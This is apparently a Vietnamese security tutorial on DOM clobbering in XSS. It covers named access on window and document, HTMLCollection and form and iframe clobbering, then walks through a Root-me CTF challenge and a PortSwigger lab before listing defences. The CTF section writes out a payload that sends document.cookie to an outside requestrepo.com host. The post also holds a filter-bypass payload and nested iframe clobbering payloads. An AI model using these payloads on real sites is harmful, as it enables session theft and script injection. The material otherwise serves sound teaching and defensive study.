---
title: Dom Clobbering trong XSS 
description: This repo maintains revisons and translations to the list of 40 questions I ask myself each year and each decade.
tags:
  - Security
pubDate: 2024-05-07
---

## DOM Clobbering là gì? Nó được sử dụng khi nào?
Theo [PortSwigger](https://portswigger.net/web-security/dom-based/dom-clobbering): DOM Clobbering là một kỹ thuật inject HTML vào một trang để thao tác với DOM với mục địch cuối cùng là thay đổi hành vi của JavaScript trên trang. Kỹ thuật **đặc biệt hữu ích trong trường hợp không thể thực hiện được XSS, nhưng có thể kiểm soát các HTML elements trên trang** có thuộc tính `id` hoặc `name` sau khi được filter bằng whitelist. 
Thuật ngữ **clobbering** (ghi đè) xuất phát từ thực tế là việc "clobbering" một biến global hoặc thuộc tính của một đối tượng và thay vào đó ghi đè lên nó bằng DOM hoặc HTMLCollection.

## Tổng quan
### object `window` và khả năng truy cập
Theo WHATWG về [named access on the window object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object):

![image](https://hackmd.io/_uploads/ByrWFdb6p.png)


>WHATWG là viết tắt của "Web Hypertext Application Technology Working Group." Đây là một nhóm làm việc chuyên nghiên cứu và phát triển các chuẩn web.

Như vậy khi truy cập `name` qua `window` (`window[name]` hay `window.name`) sẽ trả về một element hoặc là một collection các elements.
Một điều đặc biệt là: khi một element được gán attribute `id` thì có thể truy cập được đến element đó qua `window` với `name` là `id`. Với tính chất của object `window` thì: `id` đó trở thành biến global gọi đến element kia.

![image](https://hackmd.io/_uploads/rk4jnO-pp.png)

Còn khi có nhiều element có cùng `id` nó sẽ trở thành **HTMLCollection**:

![image](https://hackmd.io/_uploads/H1JMa_-aa.png)

Khác với `id` thì attribute `name` cũng như vậy nhưng đối với một số tags nhất định.
Bằng script đơn giản để xem **tag** nào có thể dùng ghi được vào `window`:
```javascript!
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']
for(tag of tags){
    html = `<${tag} name="test">`
    document.body.innerHTML = html
    try{
        if(window.test){
            console.log(tag)
        }
    }
    catch{}
}
```
Kết quả:


![image](https://hackmd.io/_uploads/SyjZxcZ6p.png)

**=>Như vậy các tags: `embed`, `form`, `iframe`, `image`, `img`, `object` có thể dùng được dưới `window` từ attribute `name`**
### object `document` và khả năng truy cập

Tương tự với `window`:

![image](https://hackmd.io/_uploads/r1PvW9-pT.png)

>Tham khảo tại: https://html.spec.whatwg.org/multipage/dom.html#dom-tree-accessors

- Với attribute `id`:
Test với script:
```javascript!
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']
for(tag of tags){
    html = `<${tag} id="test">`
    document.body.innerHTML = html
    try{
        if(document.test){
            console.log(tag)
        }
    }
    catch{}
}
```
Kết quả:

![image](https://hackmd.io/_uploads/SJ0KDxMT6.png)

Như vậy chỉ có tag `object`.
- Với attribute `name`:
Script tương tự:
```javascript!
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']
for(tag of tags){
    html = `<${tag} name="test">`
    document.body.innerHTML = html
    try{
        if(document.test){
            console.log(tag)
        }
    }
    catch{}
}
```
Kết quả:

![image](https://hackmd.io/_uploads/ryPgulM66.png)

Có thể thấy các tags `embed`, `form`, `iframe`, `image`, `img`, `object` có thể ghi được vào `document` với attribute `name`. (Điều này giống với object `window`).
### Tại sao lại vậy?
Khi web được load, browser sẽ tạo DOM Tree để thể hiện cho cấu trúc, nội dung của trang web. Thuật toán [named property visibility](https://webidl.spec.whatwg.org/#dfn-named-property-visibility) là một cơ chế quy định cách mà các atrribute được gán trong HTML được truy cập và xử lý trong JavaScript. Khi một trang web chứa các elements HTML với atrribute `id` hoặc `name`, browser sẽ tự động ánh xạ các elements này thành các object trong JavaScript dựa trên các atrributes đó. Điều này có nghĩa là các phần tử HTML với id hoặc name sẽ trở thành các properties của object `window` hoặc `document` trong JavaScript.
Khi có sự trùng tên giữa biến JavaScript và element HTML, browser sẽ ưu tiên truy cập đến element HTML thay vì biến JavaScript. Điều này dẫn đến việc một biến JavaScript có thể bị clobbering bởi element HTML cùng tên đó, và điều này có thể dẫn đến các cuộc tấn công như XSS thông qua DOM Clobbering.
### Clobbering trong `object` và `document`
><details>
><summary>
>Như đã nói, ta đã biết được khả năng truy cập từ <b>window</b> và <b>document</b>, nhưng thực sự đã có việc <b>clobbering</b> ở đây hay không?
>
></summary>
>   
>Câu trả lời là: <b>với document thì có còn với window thì không.</b>
>
>![image](https://hackmd.io/_uploads/Sy5hIJvT6.png)
>
></details>

Trước tiên ta đề cập tới vấn đề [prototype](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes).
#### Object prototypes
Lấy ví dụ với object sau:
```javascript!
const person = {
  name: "chuong",
  greet() {
    console.log('hello');
  },
};
```
object trên có 1 property `name` và 1 method là `greet()`. Tuy nhiên không chỉ vậy, object này còn có nhiều properties khác nữa:

![image](https://hackmd.io/_uploads/BJPNr5B6T.png)

Chúng đến từ đâu?
Mọi object trong JavaScript đều có một built-in property, được gọi là prototype. Bản thân prototype là một object, vì vậy prototype sẽ có prototype của nó, tạo nên prototype chain. Chain này kết thức khi chạm tới giá trị `null`.
- Để lấy prototype ta sử dụng `Object.getPrototypeOf(obj)`

    ![image](https://hackmd.io/_uploads/S1k3OcHaT.png)

    >Hoặc có thể sử dụng `__proto__`. Ví dụ: `person.__proto__`

    Khi cố gắng truy cập vào property của object, nếu không tìm thấy trên chính đối tượng đó thì sẽ chuyển sang prototype của object đó để tìm kiếm.
- Để kiểm tra một property có thuộc object đó không ta sử dụng
`obj.hasOwnProperty()`, method này sẽ chỉ kiểm tra trong chính obj hiện tại:

    ![image](https://hackmd.io/_uploads/r1K_91D66.png)
    
    Do ở đây `toString` thuộc prototype của nó:
    
    ![image](https://hackmd.io/_uploads/HyZQikDaa.png)
    
#### window
Quay trở lại, với element HTML chứa attribute `id` và `name` mà ta có thể truy cập từ `window`:

![image](https://hackmd.io/_uploads/HkJ0Wxwaa.png)

Nhưng nó không được **clobbering** vào object `window` để trở thành property:

![image](https://hackmd.io/_uploads/rJXTa1PTp.png)

Thay vào đó nó thuộc về:

![image](https://hackmd.io/_uploads/Byxg4RJPT6.png)

Như vậy không **clobbering** từ `window`:

![image](https://hackmd.io/_uploads/SkyZLevpp.png)


>Note: Điều này chỉ đúng trên trên Chromium-based browser.
>(Có thể việc xử lý `window` trên Chomre khác với browser khác)
#### document

![image](https://hackmd.io/_uploads/Bk0KbxPap.png)


Như vậy là `document` có thể **clobbering** được.

Điều này cũng có nghĩa là `document` sẽ dễ bị attack:

![image](https://hackmd.io/_uploads/ryLdmeDT6.png)

### HTMLCollection
[HTMLCollection](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection) là collection các elements có cùng `id` hoặc `name`. 
Nó cũng collect các elements cùng `id` lẫn `name`, trông rất chán =))

![image](https://hackmd.io/_uploads/r1PeGIupp.png)

Quay trở lại với ví dụ đơn giản là cùng `id`:
Để truy cập element chỉ định ta có thể sử dụng index: 0, 1, 2,... để lấy các element hoặc sử dụng `name`.
Theo specs về việc [supported property names](https://dom.spec.whatwg.org/#ref-for-dfn-supported-property-names):

![image](https://hackmd.io/_uploads/SJsSMDOpp.png)

Ví dụ:

![image](https://hackmd.io/_uploads/Sy6wNvdTa.png)

>Tương tự việc truy cập element từ `HTMLCollection` có cùng attribute `name` và dựa vào `id`.


### [toString()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString)
Đây là method convert từ object sang string.
Cái hay của nó không không chỉ nằm trong JavaScript mà còn ở các ngôn ngữ khác như PHP, Java,... Đó là việc tự động thực thi khi obj được dùng dưới dạng string. Trong JavaScript, một số hàm có thể làm điều này như:
`String()`, `innerHTML`, `outerHTML`, `innerText`,...
Ví dụ về `innerHTML`:

![image](https://hackmd.io/_uploads/BJN7gY_6p.png)

Như vậy là mảng `myArr` trên đã chuyển sang string.

**Quay trở lại với Dom Clebbering, chúng ta chỉ control `x`, `y`, `x.y`, `x.y.z`, ... dưới dạng element. Vậy các element đó khi chuyển sang string sẽ như thế nào?**
Với tag `div` nó sẽ trở thành `[object HTMLDivElement]`:

![image](https://hackmd.io/_uploads/HJhK-YOp6.png)

>Nó chỉ trả về thông tin của tag đó. Vậy có phải tag nào cũng như vậy không? 
>Câu trả lời là **không**.

Ví dụ khác với tag `<a id="x" href="http://example.com"></a>`, kết quả thu được:

![image](https://hackmd.io/_uploads/S1XwcFOap.png)

`http://example.com/` - giá trị `href`, lý do là tag `<a>` tương ứng với interface [HTMLAnchorElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement) có instance method `toString()` trả vè giá trị của `href`:

![image](https://hackmd.io/_uploads/HkzbjYda6.png)

Để kiểm tra xem còn tag nào như vậy không, ta dùng một đoạn script:

```javascript!
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']
for(tag of tags){
    html = `<${tag} id="x">`
    document.body.innerHTML = html
    try{
        if(!x.toString().includes('[object')){
            console.log(tag)
        }
    }
    catch{}
}
```
Kết quả:

![image](https://hackmd.io/_uploads/SkGW6t_66.png)

Và có thêm tag `<area>` tương tự tag `<a>`:

![image](https://hackmd.io/_uploads/Hkf46F_pT.png)




## [Root-me: DOM Clobbering](https://www.root-me.org/en/Challenges/Web-Client/DOM-Clobbering)
Trước khi tìm hiểu tiếp, ta thực hành một bài trên root-me.

![image](https://hackmd.io/_uploads/ry8QzWva6.png)
### Phân tích
Trên `/renderer`,

Bài sử dụng thư viện `DOMPurify 2.3.4`:

![image](https://hackmd.io/_uploads/H1H3G-wTa.png)

Để filter `input`:

```javascript!
// Purify input
input = DOMPurify.sanitize(input);
```

1 đoạn code `debug_script` với mục đích tạo ra tag `<script>`:

```javascript
if(typeof debug != 'undefined') {
    // Debug header
    document.getElementById("debug_header").innerHTML = "<h1>Debug Mode Activated</h1>"

    // Debug output
    // document.write("2")
    // Custom debug
    custom_debug = document.createElement('script');
    try {
        const path = String(debug.path).slice(8,) // Note for admin: slice used to avoid bugs, fix it as soon as possible
        const params = debug.params.textContent
        const debug_url = new URL("http://debug.secure_renderer" + path + "/debug" + params); // Make sure that right FQDN and endpoint is being used and generate URL object
        custom_debug.src = debug_url.origin + debug_url.pathname // Set final secure url as custom debug script source
    } catch {}
    document.body.appendChild(custom_debug);
};
```
Cả 2 được truyền vào html để render (được enable thêm CSP):

![image](https://hackmd.io/_uploads/SJvB8-PaT.png)

Với payload bình thường đã bị filter qua thư viện:

![image](https://hackmd.io/_uploads/H1t3PbvaT.png)

### Khai thác
Với chức năng debug theo script trên, điều kiện đầu tiên là `typeof debug != 'undefined'`, ta chỉ cần inject tag html có `id=debug` là được, ví dụ `<div id=debug></div>`

![image](https://hackmd.io/_uploads/SybtK-DpT.png)

Như vậy là đã đi được vào.
Dựa vào Dom Clebbering, ta có thể control được `debug` và cả `path` và `params`.

```javascript!
const path = String(debug.path).slice(8,)
const params = debug.params.textContent
```
Từ đó control được `debug_url`:
```javascript!
const debug_url = new URL("http://debug.secure_renderer" + path + "/debug" + params);
```
Tức là `src` của tag `<script>` luôn:

```javascript!
custom_debug.src = debug_url.origin + debug_url.pathname
...
document.body.appendChild(custom_debug);
```
>Trong HTMLCollection, ta còn có thể truy cập element dựa vào attribute `name`. Ví dụ:
>
>![image](https://hackmd.io/_uploads/SJh_lbd6a.png)
>
>Như đã nói element `<a>` (`HTMLAnchorElement`) có instance method là `toString()` và nó sẽ tự động gọi khi qua hàm `String()` để trả về giá trị `href`:
>
>![image](https://hackmd.io/_uploads/B1EQGZuap.png)

Ở đây mình thấy `params` không cần thiết nên sẽ bỏ qua ~~ (tuy nhiên vẫn cần thêm vào đề tránh gặp lỗi)

Quay trở lại với việc tạo `path`:
- Thứ nhất là path sẽ `slice(8,)` tức là cắt bỏ đi 8 ký tự đầu, ta cần phải custom cho phù hợp.

    ```javascript!
    const path = String(debug.path).slice(8,)
    ```
- Thứ hai: host hiện tại là `debug.secure_renderer` ta có thể thay đổi nó bằng `@` vì URL object trong javascript có thể parse nó.

    ![image](https://hackmd.io/_uploads/B1_tEWO6a.png)

Trước khi nói tiếp thì mình đề cập thêm chức năng của web:

![image](https://hackmd.io/_uploads/HyufBbda6.png)

![image](https://hackmd.io/_uploads/B1fBrZuTp.png)

Ta có thể tạo ra nội dung file JS tương ứng:

![image](https://hackmd.io/_uploads/HJoDBZ_aa.png)

>Mình mất khá nhiều thời gian để tìm cách bypass CSP và bất thành cho đến khi phát hiện điều này 
>༼ つ ◕_◕ ༽つ

 
Vì path được nối thêm `/debug` nên cần comment nó lại.

Vậy ta sẽ hướng đến URL của tag script như sau: `http://challenge01.root-me.org:58057/callback/alert(1);/`

Tóm lại payload hiện tại sẽ là:
```javascript!
<a id=debug>
<a id=debug name=path href="//a@challenge01.root-me.org:58057/callback/alert(1);/"></a>
<div id=debug name=params>a</div>
```

![image](https://hackmd.io/_uploads/SJsMgGuTT.png)

Kết quả:

![image](https://hackmd.io/_uploads/r14hdZ_aT.png)

Tag script được tạo khi đó:

![image](https://hackmd.io/_uploads/r1plYZ_6T.png)

Bây giờ tạo payload để lấy cookie thôi:
```javascript
<a id=debug>
<a id=debug name=path href="//a@challenge01.root-me.org:58057/callback/location.href='https://3smz6rsl.requestrepo.com%3Fc='+document.cookie;/"></a>
<div id=debug name=params>a</div>
```
Đoạn script khi đó:

![image](https://hackmd.io/_uploads/H15Ko-upa.png)

![image](https://hackmd.io/_uploads/S1sco-_a6.png)


Gửi URL vào phần `/report` và chờ đợi 1-2 phút:

![image](https://hackmd.io/_uploads/BkL3ybOa6.png)



## form element
Đây là một kỹ thuật phổ biến sử dụng element `form` kết hợp với element khác như `input` để clobbering `x.y` (trong đó `x` có thể là bất kỳ x, `window.x`, hoặc `document.x`)
Khác với việc clobbering thông thường từ tag khác, form có có mỗi quan hệ parent-child với tag khác, điển hình là `input`.

![image](https://hackmd.io/_uploads/r1Zs4n_p6.png)

Để kiểm tra xem có tag nào tương tự `input` ta dùng script:

```javascript!
tags = ['a', 'a2', 'abbr', 'acronym', 'address', 'animate', 'animatemotion', 'animatetransform', 'applet', 'area', 'article', 'aside', 'audio', 'audio2', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'custom tags', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'iframe2', 'image', 'image2', 'image3', 'img', 'img2', 'input', 'input2', 'input3', 'input4', 'ins', 'kbd', 'keygen', 'label', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nextid', 'nobr', 'noembed', 'noframes', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'plaintext', 'pre', 'progress', 'q', 'rb', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'set', 'shadow', 'slot', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'svg', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'video2', 'wbr', 'xmp']
for(tag of tags){
    html = `<form id=x >
    <${tag} id="y"></form>`
    document.body.innerHTML = html
    try{
        if(x.y){
            console.log(tag)
        }
    }
    catch{}
}
```
Kết quả:

![image](https://hackmd.io/_uploads/HkuDMwY66.png)

Như vậy là các tags: `button`, `fieldset`, `image`, `img`, `input`, `object`, `output`, `select`, `textarea` dùng được. (các tag này dùng `id` hay `name` đều được)

![image](https://hackmd.io/_uploads/r1fG7PFpp.png)


Ví dụ: [Lab: Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters) trên PortSwigger.

Bài này dùng thư viện `HTMLJanitor` dính lỗ hổng.
Về cơ bản, nó tương tự các sanitize của DomPurify: tạo DOM -> duyệt qua các Node -> Filter whitelist.
Theo config:

![image](https://hackmd.io/_uploads/rJqYM0dpT.png)

Điều này cho phép sử dụng `input` với thuộc tính `name`, `type`, `value`; `form` với thuộc tính `id`.

Hàm `_sanitize` thực hiện filter, trong đó tạo `TreeWalker` và lấy ra node đầu tiên qua method `firstChild()`:

![image](https://hackmd.io/_uploads/Bk1QECuTa.png)

Sau đó duyệt qua từng attribute của node để filter:

![image](https://hackmd.io/_uploads/ryveUjUpT.png)

Mục tiêu của bài này là clobbering `node.attributes` để nó trả về `undefined` để flow code không đi qua vòng lặp => bypass filter.

Vì vậy trong `form` vào ta inject tag `input` có `name="attributes"` => method `firstChild()` nhận tag `input` này => clobbering

Payload:
```htmlembedded
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```
Ta trigger event `onfocus` dựa vào `id` với fragment.

![image](https://hackmd.io/_uploads/rksfwRu6a.png)

Kết quả:

![image](https://hackmd.io/_uploads/SkuBvRua6.png)

Giờ chỉ việc khai thác qua exploit server:

![image](https://hackmd.io/_uploads/BJMCPAupa.png)

Okay.

![image](https://hackmd.io/_uploads/rJq-OAdpT.png)




## iframe element
Khác với các tag khác, đối với `iframe`, khi truy cập từ `id` sẽ trả về element, còn khi truy cập từ `name` sẽ trả về window chứa `iframe` đó:

![image](https://hackmd.io/_uploads/HJi_ettaT.png)


`iframe` có attribute `srcdoc` để tạo ra `#document` mới.

![image](https://hackmd.io/_uploads/rkUhZFt6p.png)

Từ đó ta dùng `name` từ `iframe` để lấy ra các element trong `srcdoc` để thực hiện DOM Clobbering (điều này tương tự với object `window` đã nói phía trên).

![image](https://hackmd.io/_uploads/S1_f4YFaa.png)

<details>
<summary><b>bonus</b></summary>
- Với CSP có <code>script-src: selft</code> sẽ không cho phép thực thi JS bằng protocol <code>data:</code> hoặc từ <code>srcdoc</code>.<br>
-
</details>

## Clobbering Higher Levels
Kỹ thuật này có thể clobbering lên chuỗi properties: `a.b.c.d...`

**[DOMC Payload Generator](https://domclob.xyz/domc_payload_generator/)**

`a.b.c.d`:
```htmlembedded!
<iframe name="a" srcdoc="<iframe name='b' srcdoc='<a id=c></a><a id=c name=d href=clobbered></a>'></iframe>"></iframe>
```
`a.b.c.d.e`:
```htmlembedded!
<iframe name=window srcdoc=" <iframe name=a srcdoc=&quot; <iframe name=b srcdoc=&amp;quot; <iframe name=c srcdoc=&amp;amp;quot; <iframe name=d srcdoc=&amp;amp;amp;quot; <a id='e' href='clobbered'></a> &amp;amp;amp;quot;></iframe> &amp;amp;quot;></iframe> &amp;quot;></iframe> &quot;></iframe> "></iframe>
```
## Phòng chống
- HTML Sanitization: sử dụng DOMPurify kèm option `SANITIZE_DOM` hay `SANITIZE_NAMED_PROPS` hoặc [Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)
- CSP
- Sử dụng [`Object.freeze()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze)
- Validate input
- Không sử dụng document, window cho biến global
- Cẩn thận với Document Built-in APIs
- Sử dụng `strict`

## Refs
- https://domclob.xyz/
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/research/dom-clobbering-strikes-back
- https://hacklido.com/blog/43-an-art-of-dom-clobbering-from-zero-to-advance-level
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering
